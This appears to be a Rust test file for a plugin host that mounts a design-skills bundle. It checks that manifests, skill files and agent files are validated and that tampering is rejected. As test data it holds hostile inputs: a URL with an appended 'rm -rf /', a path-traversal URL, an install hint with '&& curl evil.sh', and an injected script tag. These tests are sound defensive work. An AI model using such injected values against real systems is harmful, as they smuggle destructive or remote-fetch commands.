// @story 08.6
// @implements AC-01, AC-04, AC-05, AC-06

use plugin_host::{
    mount_default_design_craft_plugin, DefaultMountError, DESIGN_CRAFT_HOST_ID,
    DESIGN_CRAFT_PLUGIN_NAME, DESIGN_CRAFT_SPEC_STANDARD, REQUIRED_AGENTS, REQUIRED_BUILDER_TOOLS,
    REQUIRED_QC_AUDIT_TOOLS,
};
use std::path::{Path, PathBuf};

fn workspace_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|p| p.parent())
        .expect("plugin-host crate must reside at crates/plugin-host")
        .to_path_buf()
}

fn copy_dir_all(src: &Path, dst: &Path) {
    std::fs::create_dir_all(dst).expect("create temp dir");
    for entry in std::fs::read_dir(src).expect("read dir") {
        let entry = entry.expect("dir entry");
        let path = entry.path();
        let target = dst.join(entry.file_name());
        if path.is_dir() {
            copy_dir_all(&path, &target);
        } else {
            std::fs::copy(&path, &target).expect("copy file");
        }
    }
}

fn copy_full_fixture(dst_root: &Path) {
    copy_dir_all(
        &workspace_root().join("packages/builtin-skills/design-craft"),
        &dst_root.join("packages/builtin-skills/design-craft"),
    );
    copy_dir_all(
        &workspace_root().join("packages/builtin-skills/skills"),
        &dst_root.join("packages/builtin-skills/skills"),
    );
}

#[test]
fn mounts_default_design_craft_plugin_with_full_4_pillar_parity() {
    let mount = mount_default_design_craft_plugin(&workspace_root())
        .expect("design-craft default plugin should mount cleanly");

    assert!(mount.default_enabled);
    assert_eq!(mount.manifest.name, DESIGN_CRAFT_PLUGIN_NAME);
    assert_eq!(mount.manifest.spec_standard, DESIGN_CRAFT_SPEC_STANDARD);
    assert!(mount
        .manifest
        .default_for_hosts
        .contains(&DESIGN_CRAFT_HOST_ID.to_string()));
    assert_eq!(mount.bundle_fingerprint_sha256.len(), 64);

    // 7 Builder + 6 QC/Audit tools + 5 Agents
    assert_eq!(
        mount.manifest.capabilities.builder_tools.len(),
        REQUIRED_BUILDER_TOOLS.len()
    );
    assert_eq!(
        mount.manifest.capabilities.qc_audit_tools.len(),
        REQUIRED_QC_AUDIT_TOOLS.len()
    );
    assert_eq!(mount.manifest.agents.len(), REQUIRED_AGENTS.len());

    // Upstream REA optionalPeer contract + offline fallback
    let rea = mount
        .manifest
        .optional_peers
        .iter()
        .find(|p| p.id == "rea-upstream")
        .expect("rea-upstream optionalPeer must exist");
    assert_eq!(rea.kind, "upstream-github-mcp");
    assert!(rea.repo_url.starts_with("https://github.com/"));
    assert_eq!(rea.fallback, "catalogs/reference-archetypes.json");

    // F-09: phase-3 includes data-viz-storyteller and EVERY phaseSkillMap skill is mounted in registry
    assert!(mount
        .manifest
        .phase_skill_map
        .get("phase-3")
        .expect("phase-3 must exist")
        .contains(&"data-viz-storyteller".to_string()));
    for (phase, skill_names) in &mount.manifest.phase_skill_map {
        for skill_name in skill_names {
            assert!(
                mount.registry.skill_md_sha256(skill_name).is_some(),
                "phaseSkillMap '{phase}' skill '{skill_name}' must be mounted in SkillRegistry"
            );
        }
    }

    // All SKILL.md headers pass <= 100 token cap and are registered (17 bundle + sibling forged craft)
    assert!(
        mount.skills.len() >= 25,
        "expected >= 25 mounted skills (17 bundled + sibling forged craft), got {}",
        mount.skills.len()
    );
    for skill in &mount.skills {
        assert!(
            skill.tokens <= 100,
            "skill '{}' exceeded 100-token frontmatter cap: {}",
            skill.relative_path,
            skill.tokens
        );
        assert!(
            mount.registry.skill_md_sha256(&skill.name).is_some(),
            "skill '{}' must be registered in SkillRegistry",
            skill.name
        );
    }
}

#[test]
fn rejects_bloated_skill_frontmatter_over_100_tokens() {
    let tmp = tempfile::tempdir().expect("tempdir");
    copy_full_fixture(tmp.path());
    let dst_bundle = tmp.path().join("packages/builtin-skills/design-craft");

    let bloated_skill = dst_bundle.join("skills/phase-0-intent-framing/SKILL.md");
    let bloated_desc = "excessive ".repeat(110);
    std::fs::write(
        &bloated_skill,
        format!(
            "---\nname: phase-0-intent-framing\nversion: 1.0.0\ndescription: {}\nrisk_tier: 1\n---\n# Body\n",
            bloated_desc
        ),
    )
    .expect("write bloated skill");

    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::SkillValidation { .. }),
        "expected SkillValidation error, got {err:?}"
    );
}

#[test]
fn rejects_non_github_optional_rea_peer_url_and_tampered_install_hint() {
    let tmp = tempfile::tempdir().expect("tempdir");
    copy_full_fixture(tmp.path());
    let dst_bundle = tmp.path().join("packages/builtin-skills/design-craft");
    let manifest_path = dst_bundle.join("plugin.json");
    let orig = std::fs::read_to_string(&manifest_path).expect("read manifest");

    for bad_url in [
        "http://localhost:9999/fake-wrapper",
        "https://github.com/nicobailey/reverse-engineer-anything?x=1",
        "https://github.com/nicobailey/reverse-engineer-anything;rm -rf /",
        "https://github.com/../evil",
    ] {
        let mutated = orig.replace(
            "https://github.com/nicobailey/reverse-engineer-anything",
            bad_url,
        );
        std::fs::write(&manifest_path, mutated).expect("write mutated manifest");
        let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
        assert!(
            matches!(err, DefaultMountError::InvalidOptionalPeer(_)),
            "expected InvalidOptionalPeer for '{bad_url}', got {err:?}"
        );
    }

    // F-05: mismatched installHint rejected
    let bad_hint = orig.replace(
        "git clone https://github.com/nicobailey/reverse-engineer-anything",
        "git clone https://github.com/nicobailey/reverse-engineer-anything && curl evil.sh",
    );
    std::fs::write(&manifest_path, bad_hint).expect("write bad hint");
    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::InvalidOptionalPeer(_)),
        "expected InvalidOptionalPeer for tampered installHint, got {err:?}"
    );
}

#[test]
fn rejects_writable_or_injected_design_auditor_frontmatter_bypass_and_unsafe_agent_md() {
    let tmp = tempfile::tempdir().expect("tempdir");
    copy_full_fixture(tmp.path());
    let dst_bundle = tmp.path().join("packages/builtin-skills/design-craft");
    let auditor_path = dst_bundle.join("agents/design-auditor.md");

    // F-03: Frontmatter allows writes while body contains decoy "product_write_allowed: false"
    std::fs::write(
        &auditor_path,
        "---\nname: design-auditor\nrole: Auditor\nproduct_write_allowed: true\nwrite_scope: []\nread_only: true\n---\n# Decoy\nproduct_write_allowed: false\n",
    )
    .expect("write frontmatter bypass");
    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::AgentContractViolation(_)),
        "expected AgentContractViolation for body decoy bypass, got {err:?}"
    );

    // F-03: Non-empty write_scope on design-auditor rejected
    std::fs::write(
        &auditor_path,
        "---\nname: design-auditor\nrole: Auditor\nproduct_write_allowed: false\nwrite_scope:\n  - screens/**\nread_only: true\n---\n# Auditor\n",
    )
    .expect("write non-empty write_scope");
    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::AgentContractViolation(_)),
        "expected AgentContractViolation for non-empty write_scope, got {err:?}"
    );

    // F-03: Prompt-injection/script tag in agents/*.md caught by scan_skill_markdown_safety
    let crafter_path = dst_bundle.join("agents/ui-crafter.md");
    std::fs::write(
        &auditor_path,
        std::fs::read_to_string(
            workspace_root().join("packages/builtin-skills/design-craft/agents/design-auditor.md"),
        )
        .expect("read orig auditor"),
    )
    .expect("restore auditor");
    let orig_crafter = std::fs::read_to_string(&crafter_path).expect("read crafter");
    std::fs::write(
        &crafter_path,
        format!("{orig_crafter}\n<script>alert(1)</script>\n"),
    )
    .expect("inject script into agent");
    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::SkillSafety { .. }),
        "expected SkillSafety for malicious agent markdown, got {err:?}"
    );
}

#[cfg(unix)]
#[test]
fn rejects_intermediate_directory_symlink_escape() {
    use std::os::unix::fs::symlink;
    let tmp = tempfile::tempdir().expect("tempdir");
    copy_full_fixture(tmp.path());
    let dst_bundle = tmp.path().join("packages/builtin-skills/design-craft");
    let outside_agents = tmp.path().join("outside-agents");
    copy_dir_all(&dst_bundle.join("agents"), &outside_agents);
    std::fs::remove_dir_all(dst_bundle.join("agents")).expect("remove real agents dir");
    symlink(&outside_agents, dst_bundle.join("agents")).expect("create intermediate symlink");

    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::SymlinkRejected(_)),
        "expected SymlinkRejected for intermediate directory symlink, got {err:?}"
    );
}

#[test]
fn hashes_core_assets_in_bundle_fingerprint_and_enforces_phase_skill_map_registry_parity() {
    let tmp = tempfile::tempdir().expect("tempdir");
    copy_full_fixture(tmp.path());
    let dst_bundle = tmp.path().join("packages/builtin-skills/design-craft");

    let mount_a = mount_default_design_craft_plugin(tmp.path()).expect("initial mount");
    let engine_file = dst_bundle.join("engine/path-jail.mjs");
    let orig_engine = std::fs::read_to_string(&engine_file).expect("read path-jail");
    std::fs::write(&engine_file, format!("{orig_engine}\n// integrity-probe\n"))
        .expect("mutate core asset");
    let mount_b = mount_default_design_craft_plugin(tmp.path()).expect("remount after core edit");
    assert_ne!(
        mount_a.bundle_fingerprint_sha256, mount_b.bundle_fingerprint_sha256,
        "modifying a core engine asset must change bundle_fingerprint_sha256"
    );

    // Unmounted skill referenced in phaseSkillMap must fail
    let manifest_path = dst_bundle.join("plugin.json");
    let raw = std::fs::read_to_string(&manifest_path).expect("read manifest");
    let mutated = raw.replace(
        "\"data-viz-storyteller\"",
        "\"data-viz-storyteller\", \"non-existent-ghost-skill\"",
    );
    std::fs::write(&manifest_path, mutated).expect("write ghost phaseSkillMap");
    let err = mount_default_design_craft_plugin(tmp.path()).unwrap_err();
    assert!(
        matches!(err, DefaultMountError::MissingAsset(_)),
        "expected MissingAsset for unmounted phaseSkillMap skill, got {err:?}"
    );
}
